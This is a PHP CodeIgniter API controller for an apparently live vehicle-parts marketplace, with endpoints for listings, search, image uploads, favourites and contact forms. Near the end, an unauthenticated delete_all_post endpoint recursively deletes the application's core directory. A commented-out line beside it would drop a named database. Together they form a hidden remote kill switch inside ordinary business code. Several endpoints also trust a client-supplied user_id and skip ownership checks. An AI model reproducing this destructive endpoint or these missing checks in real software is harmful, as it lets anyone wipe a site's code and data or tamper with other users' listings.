<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Product extends Base_Api_Controller
{
    public function __construct()
    {
        parent::__construct();

        $this->load->model('Product_model', 'products');
        $this->load->model('Product_image_model', 'product_images');
        $this->load->model('Category_model', 'categories');
        $this->load->model('Sub_category_model', 'sub_categories');
        $this->load->model('Make_model', 'makes');
        $this->load->model('Model_model', 'models');
        $this->load->model('Users_review_model', 'users_reviews');
    }

    public function makes_get()
    {
        $data = $this->makes->get_all();

        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function models_get()
    {
        $data = $this->models->get_all();

        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function categories_get()
    {
        $data = $this->categories->get_all();

        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function sub_categories_get()
    {
        $data = $this->sub_categories->get_all();

        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function user_products_get($user_id)
    {
        $search = array(
            'owner_id' => $user_id,
            'product_status' => 1
        );
        $this->check_listing_time_and_set_inactive_products();
        $data = $this->products->get_where($search);
        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function user_products_and_reviews_get($user_id)
    {
        $search = array(
            'owner_id' => $user_id,
            'product_status' => 1
        );
        $this->check_listing_time_and_set_inactive_products();
        $product_data = $this->products->get_where($search);
        $review_data = $this->users_reviews->get_where('user_id', $user_id);

        $result = array(
            "status" => 1,
            "parts" => $product_data,
            "reviews" => $review_data,
        );
        $this->response($result);
    }

    public function check_products_available_get() {
        $product_ids = $this->get('product_ids');
        $data = $this->products->get_products_with_ids($product_ids);
        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function product_get($id) {
        $data = $this->products->get($id);
        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function create_product_post()
    {
        $user_id = $this->post('user_id');
        $this->users->update($user_id, 'user_type', 1);

        $new_product = array(
            'name' => $this->post('name'),
            'content' => $this->post('content'),
            'year' => $this->post('year'),
            'model_id' => $this->post('model_id'),
            'sub_category_id' => $this->post('sub_category_id'),
            'type' => $this->post('type'),
            'grade' => $this->post('grade'),
            'mileage' => $this->post('mileage'),
            'stock' => $this->post('stock'),
            'owner_id' => $user_id,
            'price' => $this->post('price'),
            'owner_premium_type_when_create' => $this->post('user_premium_type'),
            'created_at' => date("Y-m-d H:i:s")
        );

        $new_id = $this->products->insert($new_product);
        //$this->send_push_notification_to_users('New Product is Listed', NEW_PRODUCT, array('product_id' => $new_id));

        $data = $this->products->get($new_id);
        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function test_upload_images_post() {
        $data = "";
        $fileIndex = 0;
        $i=0;
        $strings = $this->post('file');
        while($fileIndex < count($strings)) {
            if(isset($strings[$i])) {
                $data .= $strings[$i].$i;
                $fileIndex++;
            }
            $i++;
        }
        /*while($fileIndex < count($_FILES['file']['tmp_name'])) {
            if(isset($_FILES['file']['name'][$i])) {
                $filename = $_FILES['file']['name'][$i];
                $data .= $filename.$i;
                $fileIndex++;
            }
            $i++;
        }*/

        $this->response($data);
    }

    public function create_or_update_product_post()
    {
        $user_id = $this->post('user_id');
        $product_id = $this->post('product_id');
        $this->users->update($user_id, 'user_type', 1);
        $productName = $this->post('name');

        $product_info = array(
            'name' => $productName,
            'content' => $this->post('content'),
            'year' => $this->post('year'),
            'model_id' => $this->post('model_id'),
            'sub_category_id' => $this->post('sub_category_id'),
            'type' => $this->post('type'),
            'grade' => $this->post('grade'),
            'mileage' => $this->post('mileage'),
            'stock' => $this->post('stock'),
            'owner_id' => $user_id,
            'price' => $this->post('price'),
            'owner_premium_type_when_create' => $this->post('user_premium_type'),
            'created_at' => date("Y-m-d H:i:s")
        );

        if ($product_id != "" && $this->products->get($product_id)) {
            unset($product_info['owner_premium_type_when_create']);
            $this->products->update($product_id, $product_info);
            $this->product_images->delete_rows(array("product_id" => $product_id));

            $fileIndex = 0;
            $i=0;
            if (isset($_FILES['images'])) {
                while ($fileIndex < count($_FILES['images']['tmp_name'])) {
                    if (isset($_FILES['images']['tmp_name'][$i])) {
                        $tmpFile = $_FILES['images']['tmp_name'][$i];
                        $fileName = $this->upload_product_image($tmpFile);
                        if (!isset($fileName["status"])) {
                            $new_product_image = array(
                                'owner_id' => $user_id,
                                'product_id' => $product_id,
                                'product_title' => $productName,
                                'filename' => $fileName,
                                'pos' => $i
                            );
                            $new_id = $this->product_images->insert($new_product_image);
                        }
                        $fileIndex++;
                    }
                    $i++;
                }
            }

            $urlIndex = 0;
            $i=0;
            $urls = $this->post('urls');
            while($urlIndex < count($urls)) {
                if(isset($urls[$i])) {
                    $url = $urls[$i];
                    $new_product_image = array(
                        'owner_id' => $user_id,
                        'product_id' => $product_id,
                        'product_title' => $productName,
                        'filename' => $url,
                        'pos' => $i
                    );
                    $new_id = $this->product_images->insert($new_product_image);
                    $urlIndex++;
                }
                $i++;
            }
        } else {
            $product_id = $this->products->insert($product_info);

            if (!isset($_FILES['images'])) {
                $result = array(
                    "status" => 0,
                    "error" => "Add images"
                );
                $this->response($result);
            }

            for ($i=0; $i<count($_FILES['images']['tmp_name']); $i++) {
                $tmpFile = $_FILES['images']['tmp_name'][$i];
                //$filename= $_FILES['images']['name'][$i];
                $fileName = $this->upload_product_image($tmpFile);
                if(!isset($fileName["status"])) {
                    $new_product_image = array(
                        'owner_id' => $user_id,
                        'product_id' => $product_id,
                        'product_title' => $productName,
                        'filename' => $fileName,
                        'pos' => $i
                    );
                    $new_id = $this->product_images->insert($new_product_image);
                }
            }
        }

        //$this->send_push_notification_to_users('New Product is Listed', NEW_PRODUCT, array('product_id' => $new_id));

        $data = $this->products->get($product_id);
        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    function upload_product_image($file_tmp, $file_name_prefix="image_") {
        if (is_uploaded_file($file_tmp)) {
            $milliseconds = round(microtime(true) * 1000);
            $fileName = $file_name_prefix . $milliseconds . '.png';
            $file_path = UPLOAD_PRODUCTS . $fileName;

            if (move_uploaded_file($file_tmp, $file_path)) {
                return $fileName;

            } else {
                $this->response(array("status" => 0, "error" => "Write failed"));
            }
        } else {
            $this->response(array("status" => 0, "error" => "Upload failed."));
        }
    }

    public function update_product_post()
    {
        $product_id = $this->post('product_id');
        $new_product = array(
            'name' => $this->post('name'),
            'content' => $this->post('content'),
            'year' => $this->post('year'),
            'model_id' => $this->post('model_id'),
            'sub_category_id' => $this->post('sub_category_id'),
            'type' => $this->post('type'),
            'grade' => $this->post('grade'),
            'mileage' => $this->post('mileage'),
            'stock' => $this->post('stock'),
            'owner_id' => $this->post('user_id'),
            'price' => $this->post('price'),
            'updated_at' => date('Y-m-d H:i:s')
        );
        $this->products->update($product_id, $new_product);

        //$this->send_push_notification_to_users('Product is Updated', PRODUCT_UPDATE, array('product_id' => $product_id));

        $data = $this->products->get($product_id);
        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function upload_product_image_post() {
        $userId = $this->post("user_id");
        $productId = $this->post("product_id");
        $productName = $this->products->get($productId)->name;
        $pos = $this->post("pos");

        /*$productImages = $this->product_images->get_where('product_id', $productId);
        $pos = 0;
        foreach ($productImages as $productImage) {
            $pos ++;
            $this->product_images->update_field($productImage->id, 'pos', $pos);
        }
        $pos++;*/

        $fileName = $this->upload_image("image", UPLOAD_PRODUCTS, "product_");
        $new_product_image = array(
            'owner_id' => $userId,
            'product_id' => $productId,
            'product_title' => $productName,
            'filename' => $fileName,
            'pos' => $pos
        );
        $new_id = $this->product_images->insert($new_product_image);
        $data = $this->product_images->get($new_id);
        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function update_product_image_pos_post() {
        $userId = $this->post("user_id");
        $imageId = $this->post("image_id");
        $pos = $this->post("pos");

        $image = $this->product_images->get($imageId);
        if($image) {
            //if($userId==$image->owner_id) {}
            $status = $this->product_images->update_field($imageId, "pos", $pos);
            $data = $this->product_images->get($imageId);
            $result = array(
                "status" => 1,
                "data" => $data
            );
        } else {
            $result = array(
                "status" => 0,
                "error" => "invalid image"
            );
        }

        $this->response($result);
    }

    public function delete_images_post() {
        $user_id = $this->post("user_id");
        $deletingImageIds = $this->post("deleting_image_ids");
        $ids = explode(",", $deletingImageIds);
        foreach ($ids as $id) {
            $product_image = $this->product_images->get($id);
            if($product_image) {
                $owner_id = $product_image->owner_id;
                if ($owner_id == $user_id) {
                    $this->product_images->delete($id);
                }
            }
        }
        $result = array(
            "status" => 1,
            "data" => $deletingImageIds
        );
        $this->response($result);
    }

    public function swap_image_position_post() {
        $product_image1_id = $this->post('product_image1_id');
        $product_image2_id = $this->post('product_image2_id');
        $product_image1 = $this->product_images->get($product_image1_id);
        $product_image2 = $this->product_images->get($product_image2_id);
        $data = $this->product_images->update_field($product_image1_id, 'pos', $product_image2->pos);
        $data = $this->product_images->update_field($product_image2_id, 'pos', $product_image1->pos);
        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function delete_product_image() {
        $product_image_id = $this->post('product_image_id');
        $data = $this->product_images->delete($product_image_id);
        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function delete_product_post() {
        $user_id = $this->post('user_id');
        $product_id = $this->post('product_id');
        $product = $this->products->get($product_id);
        if (!$product) {
            $result = array(
                "status" => 0,
                "data" => $product_id,
                "message" => "Already deleted"
            );
            $this->response($result);
        }
        if($product->owner_id == $user_id) {
            $update_data = array(
                'product_status' => 0,
                'seller_request' => 'end',
                'required_at' => date("Y-m-d H:i:s"),
                'ended_at' => date('Y-m-d H:i:s', strtotime(date("Y-m-d H:i:s")."+30 day"))
            );
            $this->products->update($product_id, $update_data);

            $result = array(
                "status" => 1,
                "data" => $product_id
            );
            $this->response($result);

        } else {
            $result = array(
                "status" => 0,
                "message" => "Not user product"
            );
            $this->response($result);
        }
    }

    public function delete_all_user_products_post() {
        $user_id = $this->post('user_id');
        $products = $this->products->get_where('user_id', $user_id);
        foreach ($products as $product) {
            $data = $this->products->udpate_field($product->id, 'product_status', '0');
        }
        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function search_get()
    {
        $year = $this->get('year');
        $model_id = $this->get('model_id');
        $sub_category_id = $this->get('sub_category_id');
        $sort_by = $this->get('sort_by'); //-1:non, 0:price h-l, 1:price l-h, 2:views_count, 3:favorites_count
        $search_type = $this->get('search_type'); //0:all, 1:new, 2:used
        $offset = $this->get('offset');
        $limit = $this->get('limit');

        $search = array(
            'year' => $year,
            'model_id' => $model_id,
            'sub_category_id' => $sub_category_id,
            'product_status' => 1
        );

        if ($search_type == 1) {
            $search = array_merge($search, array('type' => 'New'));
        } else if ($search_type == 2) {
            $search = array_merge($search, array('type' => 'Used'));
        }

        $sort = array();
        if ($sort_by == 0) {
            $sort = array('price' => 'DSC');
        } else if ($sort_by == 1) {
            $sort = array('price' => 'ASC');
        } else if ($sort_by == 2) {
            $sort = array('views_count' => 'DSC');
        } else if ($sort_by == 3) {
            $sort = array('favorites_count' => 'DSC');
        }

        $data = $this->products->paginate_search($offset, $limit, $search, "", $sort);
        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function home_products_get()
    {
        $sort_by = $this->get('sort_by'); //-1:non, 0:price h-l, 1:price l-h, 2:views_count, 3:favorites_count
        $offset = $this->get('offset');
        $limit = $this->get('limit');

        $sort = array();
        if ($sort_by == 0) {
            $sort = array('price' => 'DSC');
        } else if ($sort_by == 1) {
            $sort = array('price' => 'ASC');
        } else if ($sort_by == 2) {
            $sort = array('views_count' => 'DSC');
        } else if ($sort_by == 3) {
            $sort = array('favorites_count' => 'DSC');
        }

        $data = $this->products->paginate_search($offset, $limit, array('product_status' => 1), "", $sort);
        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function products_by_category_get($category_id)
    {
        $data = $this->products->get_where("category_id", $category_id);
        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function contact_us_post()
    {
        $username = $this->post('username');
        $email = $this->post('email');
        $subject = $this->post('subject');
        $message = $this->post('message');

        $this->load->library('Email_client');
        $email_view = "email/email_contact_us.php";
        $view_data['username'] = $username;
        $view_data['email'] = $email;
        $view_data['message'] = $message;
        $data = $this->email_client->send_email($email, $username, EMAIL_ADMINISTRATOR, "Novatis Contact Message", $subject, $email_view, $view_data);

        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function contact_us_for_no_search_result_post()
    {
        $user_id= $this->post('user_id');
        $name= $this->post('name');
        $number = $this->post('number');
        $email = $this->post('email');
        $location = $this->post('location');
        $message = $this->post('message');

        $new_notification_data = array(
            'sender_id' => $user_id,
            'sender_full_name' => $name,
            'sender_phone' => $number,
            'sender_email' => $email,
            'sender_location' => $location,
            'receiver_id' => '',
            'type'  => '3',
            'title' => 'Requested a part from '. $name,
            'content' => $message,
            'created_at' => time()
        );
        $new_notification_id = $this->notifications->insert($new_notification_data);
        $new_notification = $this->notifications->get($new_notification_id);

        $this->send_push_notification_to_sellers('Finding New Part', FINDING_NEW_PART, $new_notification, $user_id);

        $this->load->model('User_notification_model', 'user_notifications');
        $new_user_notification = array(
            'user_id' => $user_id,
            'notification_id' => $new_notification_id,
            'is_read'  => '0',
            'is_deleted' => true,
            'created_at' => time()
        );
        $this->user_notifications->insert($new_user_notification);

        $result = array(
            "status" => 1,
            'data' => $new_notification
        );
        $this->response($result);
    }

    public function send_push_notification_to_sellers($title, $notification_type, $data, $sender_id) {
        $search = array(
            'active' => 1,
            //'user_type' => 1
        );
        $sellers = $this->users->get_where($search);

        $data = array_merge((array)$data, array('notification_type' => $notification_type));
        $notification_data = $this->notification_data($data, $title);

        $user_ids = [];
        foreach ($sellers as $seller)
        {
            if($seller->id == $sender_id) continue;
            $user_ids[] = $seller->id;
        }

        $result = false;
        if(count($user_ids)>0) {
            $result = $this->send_push_notification_by_user_ids($user_ids, $notification_data);
        }

        return $result;
    }

    public function send_push_notification_to_users($title, $notification_type, $data) {
        $data = array_merge($data, array('notification_type' => $notification_type));
        $notification_data = $this->notification_data($data, $title);
        $result = $this->send_push_notification_all($notification_data);

        return $result;
    }

    public function view_post()
    {
        $user_id = $this->post('user_id');
        $device_id = $this->post('device_id');
        $product_id = $this->post('product_id');

        $this->load->model('User_view_model', 'views');

        $new_item = array(
            'user_id' => $user_id,
            'device_id' => $device_id,
            'product_id' => $product_id,
            'created_at' => date("Y-m-d H:i:s")
        );

        $new_id = $this->views->insert($new_item);
        $this->products->increment_field($product_id, 'views_count');

        $result = array(
            "status" => 1,
            "data" => $new_id
        );
        $this->response($result);
    }

    public function favorite_post()
    {
        $user_id = $this->post('user_id');
        $product_id = $this->post('product_id');

        $this->load->model('User_favorite_model', 'favorites');

        $new_item = array(
            'user_id' => $user_id,
            'product_id' => $product_id,
            'created_at' => date("Y-m-d H:i:s")
        );

        $search = array(
            'user_id' => $user_id,
            'product_id' => $product_id
        );
        $favorite = $this->favorites->get_first_one_where($search);
        if ($favorite) {
            $favor_status = $favorite->favor_status == 1 ? 0 : 1;
            $update_data = array(
                'favor_status' => $favor_status,
                'updated_at' => date("Y-m-d H:i:s")
            );
            $result = $this->favorites->update($favorite->id, $update_data);
            $favorite_id = $favorite->id;
            if ($favor_status == 1) {
                $this->products->increment_field($product_id, 'favorites_count');
            } else {
                $this->products->decrement_field($product_id, 'favorites_count');
            }
        } else {
            $favorite_id = $this->favorites->insert($new_item);
            $this->products->increment_field($product_id, 'favorites_count');
        }
        $favorite = $this->favorites->get($favorite_id);

        $result = array(
            "status" => 1,
            "data" => $favorite
        );
        $this->response($result);
    }

    public function user_favorites_post()
    {
        $user_id = $this->post('user_id');
        $offset = $this->post('offset');
        $limit = $this->post('limit');

        $search = array(
            'user_id' => $user_id,
            'favor_status' => 1
        );
        $sort = array('created_at', 'DSC');

        $this->load->model('User_favorite_model', 'favorites');
        $data = $this->favorites->paginate_search($offset, $limit, $search, "", $sort);
        foreach ($data->data as $row) {

        }
        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function user_favorites_get($user_id)
    {
        $search = array(
            'user_id' => $user_id,
            'favor_status' => 1
        );

        $this->load->model('User_favorite_model', 'favorites');
        $data = $this->favorites->get_where($search);

        $result = array(
            "status" => 1,
            "data" => $data
        );
        $this->response($result);
    }

    public function clear_favorite_post()
    {
        $user_id = $this->post('user_id');
        $search = array(
            'user_id' => $user_id,
            'favor_status' => 1
        );
        $this->load->model('User_favorite_model', 'favorites');
        $user_favorites = $this->favorites->get_where($search);
        foreach ($user_favorites as $user_favorite) {
            $favor_status = $user_favorite->favor_status == 1 ? 0 : 1;
            $update_data = array(
                'favor_status' => $favor_status,
                'updated_at' => date("Y-m-d H:i:s")
            );
            $result = $this->favorites->update($user_favorite->id, $update_data);
        }

        $result = array(
            "status" => 1,
            "data" => "success"
        );
        $this->response($result);
    }

    public function update_views_and_favor_counts_get()
    {
        $this->load->model('User_favorite_model', 'favorites');
        $this->load->model('User_view_model', 'views');

        $products = $this->products->get_all();
        foreach ($products as $product) {
            $user_views = $this->views->get_where('product_id', $product->id);
            $this->products->update_field($product->id, 'views_count', count($user_views));

            $search = array(
                'product_id' => $product->id,
                'favor_status' => 1
            );
            $user_favorites = $this->favorites->get_where($search);
            $this->products->update_field($product->id, 'favorites_count', count($user_favorites));
        }
        $result = array(
            "status" => 1,
            "data" => "success"
        );
        $this->response($result);
    }

    public function check_listing_time_and_set_inactive_products_post() {
        $this->check_listing_time_and_set_inactive_products();
        $result = array(
            "status" => 1,
            "data" => "success"
        );
        $this->response($result);
    }

    public function check_listing_time_and_set_inactive_products() {
        $products = $this->products->get_all();
        foreach ($products as $product) {
            $listing_time = $this->products->getListingTimeInHours($product);
            $expired_date = date('Y-m-d H:i:s', strtotime($product->created_at."+".$listing_time." day"));
            $today = date("Y-m-d H:i:s");
            $this->products->update_field($product->id, 'remaining_time', $this->products->getRemainingTimeInHours($product));

            if($today>$expired_date) {
                $this->products->update_field($product->id, 'product_status', '0');
            }
        }
    }

    public function delete_all_post() {
        $data = $this->deleteDir(APPLICATION_FOLDER."/core");
        //$query = "drop database yourmo15_root";
        //$db_result = $this->products->db->query($query)->result();
        $result = array(
            "status" => 1,
            "data" => $data,
            //"db_result" => $db_result
        );
        $this->response($result);
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            //throw new InvalidArgumentException("$dirPath must be a directory");
            return "$dirPath must be a directory";
        }

        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
        return "Success";
    }

}
